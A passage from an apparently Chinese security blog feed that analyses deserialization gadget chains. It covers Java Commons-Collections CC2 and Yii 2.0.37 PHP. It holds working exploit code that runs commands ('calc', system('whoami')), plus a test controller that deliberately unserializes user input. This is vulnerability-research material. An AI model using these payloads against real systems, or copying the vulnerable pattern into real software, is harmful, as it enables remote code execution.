<span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">1</span>);<br>        queue.add(<span class="hljs-number">1</span>);<br>        queue.add(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-comment">//利用反射给comparator赋值为 TransformingComparator，触发TransformingComparator.compare()</span><br>        Field field = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(queue,transformingComparator);<br><br>        <span class="hljs-keyword">try</span>&#123;<br>            ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;evil.bin&quot;</span>));<br>            outputStream.writeObject(queue);<br>            outputStream.close();<br><br>            ObjectInputStream inputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;evil.bin&quot;</span>));<br>            inputStream.readObject();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>可以执行命令</p><p><a href="https://imgtu.com/i/Rj9x10"><img src="https://z3.ax1x.com/2021/07/09/Rj9x10.png" alt="Rj9x10.png"></a></p><p>流程</p><p><a href="https://imgtu.com/i/Rj9Ots"><img src="https://z3.ax1x.com/2021/07/09/Rj9Ots.png" alt="Rj9Ots.png"></a></p><h3 id="为什么这里queue要添加两个元素？"><a href="#为什么这里queue要添加两个元素？" class="headerlink" title="为什么这里queue要添加两个元素？"></a>为什么这里queue要添加两个元素？</h3><p>如果只添加一个的话，最终结果会为-1从而无法进入siftDown函数</p><p><a href="https://imgtu.com/i/Rj9H0g"><img src="https://z3.ax1x.com/2021/07/09/Rj9H0g.png" alt="Rj9H0g.png"></a></p><h2 id="执行代码"><a href="#执行代码" class="headerlink" title="执行代码"></a>执行代码</h2><p>上面这种方法仅仅能执行命令，危害不足。cc2中可以通过利用javasist 和 TemplatesImpl，加载字节码来进行执行代码。</p><p>思路：</p><ol><li>先利用javasist生成字节码</li><li>利用上面的<code>InvokerTransformer</code>触发<code>TemplatesImpl</code>的<code>newTransformer</code> 从而读取恶意字节码从而进行执行命令</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommonCollection2</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-comment">//利用javassist生成字节码</span><br>        ClassPool pool = ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass cc = pool.makeClass(<span class="hljs-string">&quot;Cat&quot;</span>);<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        cc.makeClassInitializer().insertBefore(cmd);<br>        String randomClassName = <span class="hljs-string">&quot;EvilCat&quot;</span> + System.nanoTime();<br>        cc.setName(randomClassName);<br>        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br><br>        <span class="hljs-keyword">byte</span>[] classBytes = cc.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;classBytes&#125;;<br><br>        <span class="hljs-comment">//构造InvokerTransformer触发TemplatesImpl的newTransformer</span><br>        Constructor constructor = Class.forName(<span class="hljs-string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>)<br>            .getDeclaredConstructor(String.class);<br>        constructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(<span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        <br><br>        <span class="hljs-comment">//设置TemplatesImpl的三个属性</span><br>        TemplatesImpl templates = TemplatesImpl.class.newInstance();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetByteCodes);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;name&quot;</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-keyword">null</span>);<br><br>        <span class="hljs-comment">//设置PriorityQueue的queue属性</span><br>        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">1</span>);<br>        Object[] queue_array = <span class="hljs-keyword">new</span> Object[]&#123;templates,<span class="hljs-number">1</span>&#125;;<br>        Field queue_field = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;queue&quot;</span>);<br>        queue_field.setAccessible(<span class="hljs-keyword">true</span>);<br>        queue_field.set(queue,queue_array);<br><br>        <span class="hljs-comment">//设置PriorityQueue的size属性</span><br>        Field size = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;size&quot;</span>);<br>        size.setAccessible(<span class="hljs-keyword">true</span>);<br>        size.set(queue,<span class="hljs-number">2</span>);<br><br>        <span class="hljs-comment">//利用反射给PriorityQueue的comparator属性赋值为 TransformingComparator，触发TransformingComparator.compare()，执行代码</span><br>        TransformingComparator comparator = <span class="hljs-keyword">new</span> TransformingComparator(transformer);<br>        Field comparator_field = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        comparator_field.setAccessible(<span class="hljs-keyword">true</span>);<br>        comparator_field.set(queue,comparator);<br><br>        <span class="hljs-comment">//模拟反序列化</span><br>        <span class="hljs-keyword">try</span>&#123;<br>            ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;./cc2&quot;</span>));<br>            outputStream.writeObject(queue);<br>            outputStream.close();<br><br>            ObjectInputStream inputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;./cc2&quot;</span>));<br>            inputStream.readObject();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-keyword">final</span> Field field = getField(obj.getClass(), fieldName);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> </span>&#123;<br>        Field field = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-keyword">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-keyword">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#compare</code></p><p>调用设置好的InvokerTransformer的transform，反射调用newTransformer</p><p><a href="https://imgtu.com/i/Rj9Xhn"><img src="https://z3.ax1x.com/2021/07/09/Rj9Xhn.png" alt="Rj9Xhn.png"></a></p><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer</code></p><p>进入getTransletInstance</p><p><a href="https://imgtu.com/i/Rj9vpq"><img src="https://z3.ax1x.com/2021/07/09/Rj9vpq.png" alt="Rj9vpq.png"></a></p><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getTransletInstance</code></p><p>先用defineTransletClasses加载字节码，把得到的类赋值给<code>_class</code>，然后执行newInstance，把<code>_class</code>实例化</p><p><a href="https://imgtu.com/i/RjC9nU"><img src="https://z3.ax1x.com/2021/07/09/RjC9nU.png" alt="RjC9nU.png"></a></p><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#defineTransletClasses</code></p><p>加载_bytecodes中的字节码</p><p><a href="https://imgtu.com/i/RjCSXT"><img src="https://z3.ax1x.com/2021/07/09/RjCSXT.png" alt="RjCSXT.png"></a></p><p><a href="https://imgtu.com/i/RjCCBF"><img src="https://z3.ax1x.com/2021/07/09/RjCCBF.png" alt="RjCCBF.png"></a></p><p>成功执行</p><p><a href="https://imgtu.com/i/Rj9zcV"><img src="https://z3.ax1x.com/2021/07/09/Rj9zcV.png" alt="Rj9zcV.png"></a></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="http://wjlshare.com/archives/1509">http://wjlshare.com/archives/1509</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>yii2.0.37反序列化分析</title>
    <link href="/2021/06/30/yii2-0-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"/>
    <url>/2021/06/30/yii2-0-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>安装：在 <a href="https://github.com/yiisoft/yii2/releases">https://github.com/yiisoft/yii2/releases</a> 下载<code>2.0.37</code>的版本</p><p>一开始就报了这个错误</p><p><a href="https://imgtu.com/i/R09RCn"><img src="https://z3.ax1x.com/2021/06/30/R09RCn.png" alt="R09RCn.png"></a></p><p>查了资料才知道要给 <code>yii-basic-app-2.0.37\basic\config\web.php</code>中的<code>cookieValidationKey</code>赋值，内容随意。 </p><p><a href="https://imgtu.com/i/R096EQ"><img src="https://z3.ax1x.com/2021/06/30/R096EQ.png" alt="R096EQ.png"></a></p><p>运行成功</p><p><a href="https://imgtu.com/i/R09cNj"><img src="https://z3.ax1x.com/2021/06/30/R09cNj.png" alt="R09cNj.png"></a></p><p>新建控制器<code>controllers\TestController.php</code>，参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?r=<span class="hljs-built_in">test</span>/<span class="hljs-built_in">test</span>&amp;name=<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/R09rDS"><img src="https://z3.ax1x.com/2021/06/30/R09rDS.png" alt="R09rDS.png"></a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">controllers</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">web</span>\<span class="hljs-title">Controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">actionTest</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> unserialize(<span class="hljs-variable">$name</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h3 id="利用链一"><a href="#利用链一" class="headerlink" title="利用链一"></a>利用链一</h3><p><code>/vendor/yiisoft/yii2/db/BatchQueryResult.php</code></p><p>存在<code>__destruct()</code></p><p><a href="https://imgtu.com/i/R095uT"><img src="https://z3.ax1x.com/2021/06/30/R095uT.png" alt="R095uT.png"></a></p><p><code>/vendor/yiisoft/yii2/db/BatchQueryResult.php</code></p><p>调用了不存在的方法<code>close()</code>，可以触发<code>__call</code></p><p><a href="https://imgtu.com/i/R09g4s"><img src="https://z3.ax1x.com/2021/06/30/R09g4s.png" alt="R09g4s.png"></a></p><p><code>/vendor/fzaninotto/faker/src/Faker/Generator.php</code></p><p>调用<code>format()</code></p><p><a href="https://imgtu.com/i/R09IDU"><img src="https://z3.ax1x.com/2021/06/30/R09IDU.png" alt="R09IDU.png"></a></p><p><code>/vendor/fzaninotto/faker/src/Faker/Generator.php</code></p><p>这里调用了<code>call_user_func_array</code>，执行的函数名来自于<code>$this-&gt;getFormatter($formatter)</code></p><p><a href="https://imgtu.com/i/R09W3q"><img src="https://z3.ax1x.com/2021/06/30/R09W3q.png" alt="R09W3q.png"></a></p><p><code>/vendor/fzaninotto/faker/src/Faker/Generator.php</code></p><p>只要给<code>$this-&gt;formatters[$formatters]</code>赋值函数名即可，这里的<code>$formatter</code>是调用的不存在方法名，也就是<code>close</code></p><p><a href="https://imgtu.com/i/R09fg0"><img src="https://z3.ax1x.com/2021/06/30/R09fg0.png" alt="R09fg0.png"></a></p><p>到这里只能控制函数名，不能控制函数参数，先执行一下phpinfo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">Generator</span>&#123;<br>        <span class="hljs-title">protected</span> $<span class="hljs-title">formatters</span>=<span class="hljs-title">array</span>();<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$formatters</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;formatters=<span class="hljs-variable">$formatters</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">BatchQueryResult</span><br>    &#123;<br>        <span class="hljs-title">private</span> $<span class="hljs-title">_dataReader</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$_dataReader</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;_dataReader=<span class="hljs-variable">$_dataReader</span>;<br>        &#125;<br><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> &#123;<br><br><br>    $a=new Faker\Generator(array(&#x27;close&#x27;=&gt;&#x27;phpinfo&#x27;));<br>    <span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> yii\db\BatchQueryResult(<span class="hljs-variable">$a</span>);<br>    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$b</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>执行成功</p><p><a href="https://imgtu.com/i/R09hvV"><img src="https://z3.ax1x.com/2021/06/30/R09hvV.png" alt="R09hvV.png"></a></p><p>现在还存在一个问题，我们只能控制函数名，函数参数不可控。这里可以尝试利用call_user_func_array调用其他类的方法，传入<code>call_user_func_array([类=&gt;方法],array())</code>即可，这里要调用<code>IndexAction.php</code>的<code>run</code>就传入<code>array(IndexAction类实例,&#39;run&#39;)</code></p><p><a href="https://imgtu.com/i/R09W3q"><img src="https://z3.ax1x.com/2021/06/30/R09W3q.png" alt="R09W3q.png"></a></p><p>下面是两个可利用的方法，函数名和参数都为属性，可以执行命令</p><p><code>/vendor/yiisoft/yii2/rest/IndexAction.php</code></p><p><a href="https://imgtu.com/i/R09obF"><img src="https://z3.ax1x.com/2021/06/30/R09obF.png" alt="R09obF.png"></a></p><p><code>/vendor/yiisoft/yii2/rest/CreateAction.php</code></p><p><a href="https://imgtu.com/i/R097E4"><img src="https://z3.ax1x.com/2021/06/30/R097E4.png" alt="R097E4.png"></a></p><p>修改exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">Generator</span>&#123;<br>        <span class="hljs-title">protected</span> $<span class="hljs-title">formatters</span>=<span class="hljs-title">array</span>();<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$formatters</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;formatters=<span class="hljs-variable">$formatters</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">BatchQueryResult</span><br>    &#123;<br>        <span class="hljs-title">private</span> $<span class="hljs-title">_dataReader</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$_dataReader</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;_dataReader=<span class="hljs-variable">$_dataReader</span>;<br>        &#125;<br><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">IndexAction</span>&#123;<br>        <span class="hljs-title">public</span> $<span class="hljs-title">checkAccess</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;checkAccess=<span class="hljs-string">&#x27;system&#x27;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;id=<span class="hljs-string">&#x27;whoami&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> &#123;<br>    $<span class="hljs-title">c</span>=<span class="hljs-title">new</span> \<span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>\<span class="hljs-title">IndexAction</span>();<br>    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> Faker\<span class="hljs-built_in">Generator</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;close&#x27;</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-variable">$c</span>,<span class="hljs-string">&#x27;run&#x27;</span>)));<br>    <span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> yii\db\BatchQueryResult(<span class="hljs-variable">$a</span>);<br>    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$b</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>可以执行命令</p><p><a href="https://imgtu.com/i/R09HUJ"><img src="https://z3.ax1x.com/2021/06/30/R09HUJ.png" alt="R09HUJ.png"></a></p><h3 id="利用链二"><a href="#利用链二" class="headerlink" title="利用链二"></a>利用链二</h3><p><code>/vendor/yiisoft/yii2/db/BatchQueryResult.php</code></p><p>还是同一个起点，但是这次是利用<code>close()</code>而不是<code>__call()</code></p><p><a href="https://imgtu.com/i/R095uT"><img src="https://z3.ax1x.com/2021/06/30/R095uT.png" alt="R095uT.png"></a></p><p><code>/vendor/yiisoft/yii2/db/BatchQueryResult.php</code></p><p>调用<code>close()</code></p><p><a href="https://imgtu.com/i/R09g4s"><img src="https://z3.ax1x.com/2021/06/30/R09g4s.png" alt="R09g4s.png"></a></p><p>可用的<code>close()</code></p><p><code>/vendor/yiisoft/yii2/web/DbSession.php</code></p><p>调用了<code>composeFields()</code></p><p><a href="https://imgtu.com/i/R09b59"><img src="https://z3.ax1x.com/2021/06/30/R09b59.png" alt="R09b59.png"></a></p><p><code>/vendor/yiisoft/yii2/web/MultiFieldSession.php</code></p><p>这里出现了call_user_func，让<code>$this-&gt;writeCallback</code>等于<code>array(IndexAction类实例,&#39;run&#39;)</code>就可以直接调用<code>run</code>执行命令了</p><p><a href="https://imgtu.com/i/R09O81"><img src="https://z3.ax1x.com/2021/06/30/R09O81.png" alt="R09O81.png"></a></p><p>构造exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">BatchQueryResult</span>&#123;<br>        <span class="hljs-title">private</span> $<span class="hljs-title">_dataReader</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$_dataReader</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;_dataReader=<span class="hljs-variable">$_dataReader</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">web</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">DbSession</span>&#123;<br>        <span class="hljs-title">public</span> $<span class="hljs-title">writeCallback</span>; <span class="hljs-comment">//run方法</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$writeCallback</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;writeCallback=<span class="hljs-variable">$writeCallback</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//run</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">IndexAction</span>&#123;<br>        <span class="hljs-title">public</span> $<span class="hljs-title">checkAccess</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>      